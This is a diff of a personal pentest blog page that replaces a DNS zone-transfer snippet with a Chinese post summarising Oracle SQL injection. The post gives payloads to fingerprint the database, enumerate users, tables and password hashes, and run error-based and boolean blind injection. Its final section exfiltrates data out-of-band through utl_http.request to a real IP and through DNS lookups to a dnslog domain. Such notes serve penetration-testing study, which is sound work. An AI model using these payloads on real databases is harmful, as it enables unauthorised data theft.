@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>敏感信息泄露 - Reber's Blog</title>
+    <title>SQL注入小结(Oracle) - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
-    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
+    <meta name="description" content="前几天渗透测试时遇到了Oracle的注入，这里简单总结一下Oracle中的SQL注入常见的利用手法：联合查询注入、报错型注入、布尔型注入、无返回值的盲注">
     <meta name="author" content="reber">
 
     
@@ -74,67 +74,248 @@
     </ul>
 </div>
 
-    
+
     <div class="main">
         <div class="left">
-            
-            <div class="content">
+            <div>
+                <h2>SQL注入小结(Oracle)</h2>
                 
+                <div class="post-meta">
+                    <div style="padding:5px 5px 2px 5px;">
+                        <i class="fa fa-calendar fa-fw"></i>
+                        <time>2019-01-04</time>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
                     
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/dns-zone-transfer/">DNS域传送漏洞</a></h2>
 
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2017-11-20</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
+                    
 
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
                     
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">敏感信息泄露</a>
-                    
-                
+                        
+                        
+                        
+                            <i class="fa fa-folder fa-fw"></i>
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                            
+                        
+                        
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                        
+                        
+                        
+                            <i class="fa fa-tags fa-fw"></i>
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/oracle">oracle</a>
+                            
+                        
+                        
+                    </div>
+                </div>
                 
             </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。
-若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。
-0x01 通过nslookup查看域传送漏洞 分为3步：1. 设置type为ns；2. 查询ns服务器；3. 设置ns服务器 0x02 通过dig查看域传送漏洞 0x03 通过nmap查看域传送漏洞 
-    </p>
-
-    
-</article>
-
-
+            <div class="content">
+                
                 
 
-                
+<h3 id="0x00-判断数据库类型">0x00 判断数据库类型</h3>
 
+<ul>
+<li><p>Oracle有一些自带的表：dual、user_tables</p>
+
+<ul>
+<li><code>id=45 and (select count(*) from user_tables)&gt;0--</code></li>
+<li><code>id=45 and (select count(*) from dual)&gt;0--</code></li>
+</ul></li>
+
+<li><p>利用自带的一些函数：譬如utl_http.request 这些</p></li>
+
+<li><p>利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)</p></li>
+</ul>
+
+<h3 id="0x01-基本信息获取">0x01 基本信息获取</h3>
+
+<ul>
+<li><p>查看sid</p>
+
+<pre><code>select instance_name from v$instance;
+</code></pre></li>
+
+<li><p>查看数据库版本：</p>
+
+<pre><code>select banner from v$version where rownum=1;
+select banner from sys.v_$version where rownum=1;
+</code></pre></li>
+
+<li><p>查看用户：</p>
+
+<pre><code>select user from dual; --当前用户
+select username from user_users; --当前用户
+select username from all_users; --查看所有用户
+select username from dba_users; --查看所有用户(需要有权限)
+</code></pre></li>
+
+<li><p>查看当前用户角色：</p>
+
+<pre><code>select role from session_roles;
+</code></pre></li>
+
+<li><p>查看数据库用户名和密码：</p>
+
+<pre><code>select name, password, astatus from sys.user$; --需要权限
+</code></pre></li>
+
+<li><p>通过注入获取数据</p>
+
+<pre><code>--列database
+select global_name from global_name;
+select sys.database_name from dual;
+select name from v$database;
+select instance_name from v$instance;
+--列owner
+select distinct owner from all_tables;
+--列owner的tables
+select table_name from all_tables where owner='UTEST';
+--列tables的columns
+select column_name from all_tab_columns where table_name='TUSER';
+select column_name from all_tab_cols where table_name='TUSER';
+
+
+--列tablespace
+select tablespace_name from user_tablespaces;
+--列tablespace的tables
+select table_name from user_tables where tablespace_name='DB_TEST_DATA';
+--列tables的columns
+select column_name from user_tab_columns where table_name='TUSER';
+</code></pre></li>
+</ul>
+
+<h3 id="0x02-union-query注入">0x02 UNION query注入</h3>
+
+<ul>
+<li><p>存在注入
+<img src="/img/post/20190103-162239.png" alt="70" /></p></li>
+
+<li><p>判断列数
+<img src="/img/post/20190103-162620.png" alt="40" />
+<img src="/img/post/20190103-162720.png" alt="80" /></p></li>
+
+<li><p>尝试union select
+<img src="/img/post/20190103-163005.png" alt="60" />
+依次判断字段类型(下图判断出第二个字段是字符型)
+<img src="/img/post/20190103-163324.png" alt="80" />
+<img src="/img/post/20190103-163228.png" alt="50" /></p></li>
+
+<li><p>得到表名<br />
+得到表的个数
+<img src="/img/post/20190103-164019.png" alt="75" />
+得到第一个表的表名
+<img src="/img/post/20190103-163610.png" alt="75" />
+得到第二个表的表名
+<img src="/img/post/20190103-164519.png" alt="75" /></p></li>
+
+<li><p>得到第一个表的字段
+<img src="/img/post/20190103-165302.png" alt="80" /></p></li>
+
+<li><p>得到第一个表的数据
+<img src="/img/post/20190103-170336.png" alt="80" /></p></li>
+</ul>
+
+<h3 id="0x03-error-based注入">0x03 error-based注入</h3>
+
+<ul>
+<li><p>ctxsys.drithsx.sn
+<img src="/img/post/20190104-160714.png" alt="60" /></p></li>
+
+<li><p>dbms_xdb_version.checkin
+<img src="/img/post/20190104-161325.png" alt="80" /></p></li>
+
+<li><p>dbms_xdb_version.makeversioned
+<img src="/img/post/20190104-161521.png" alt="85" /></p></li>
+
+<li><p>dbms_xdb_version.uncheckout
+<img src="/img/post/20190104-161727.png" alt="85" /></p></li>
+
+<li><p>dbms_utility.sqlid_to_sqlhash
+<img src="/img/post/20190104-161838.png" alt="85" /></p></li>
+
+<li><p>utl_inaddr.get_host_name(在11g以后需要是超级用户或已授予网络访问权限的用户才能使用)
+<img src="/img/post/20190104-203238.png" alt="" /></p></li>
+</ul>
+
+<h3 id="0x04-boolean-based-blind注入">0x04 boolean-based blind注入</h3>
+
+<ul>
+<li>decode</li>
+</ul>
+
+<p>decode(条件，值1，值1结果，值2，值2结果，。。。值n，值n结果，默认值)</p>
+
+<p>条件和那个值相等就返回那个值的结果
+<img src="/img/post/20190104-165737.png" alt="65" />
+<img src="/img/post/20190104-165817.png" alt="65" /></p>
+
+<ul>
+<li>instr</li>
+</ul>
+
+<p>instr(字符串，子串)</p>
+
+<p>从一个字符串中查找指定子串的位置，这里一直将位置置为1
+<img src="/img/post/20190104-201134.png" alt="55" />
+<img src="/img/post/20190104-201157.png" alt="55" />
+<img src="/img/post/20190104-201216.png" alt="55" /></p>
+
+<h3 id="0x05-无回显注入">0x05 无回显注入</h3>
+
+<ul>
+<li><p>web服务接收结果</p>
+
+<pre><code>select * from utest.msg where id=2 and 1=utl_http.request('http://59.108.35.198:8888/'||(select user from dual));
+</code></pre></li>
+
+<li><p>dns服务接收结果</p>
+
+<pre><code>select * from utest.msg where id=2 and (select utl_inaddr.get_host_address((select user from dual)||'.dnslog.wyb0.com') from dual) is not null;
+</code></pre></li>
+</ul>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="https://www.freebuf.com/articles/web/5411.html?_blank">https://www.freebuf.com/articles/web/5411.html</a></li>
+<li><a href="https://www.iswin.org/2015/06/13/hack-oracle/?_blank">https://www.iswin.org/2015/06/13/hack-oracle/</a></li>
+<li><a href="https://www.freebuf.com/column/146464.html?_blank">https://www.freebuf.com/column/146464.html</a></li>
+</ul>
+
+                
+                <div style="padding:10px 1px;">
+                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
+                    <script>
+                        var link = decodeURI(window.location.href);
+                        var url = '<a href="' + link + '">'+link+'</a>';
+                        document.write(url);
+                    </script>
+                </div>
+
+                
+<div class="prev-next-post pure-g">
+    <div class="pure-u-12-24" style="text-align: left;">
+        
+        <nav class="prev">
+            <a href="http://wyb0.com/posts/oracle-database/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;Oracle数据库
+            </a>
+        </nav>
+        
+    </div>
+    <div class="pure-u-12-24" style="text-align: right;">
+        
+    </div>
+</div>
 
             </div>
         </div>
@@ -530,7 +711,7 @@
         </div>
     </div>
 
-    <br><br>
+    <br>
     
 <div class="foot">
     <div class="copyright">
@@ -561,3 +742,5 @@
 
 </body>
 </html>
+
+
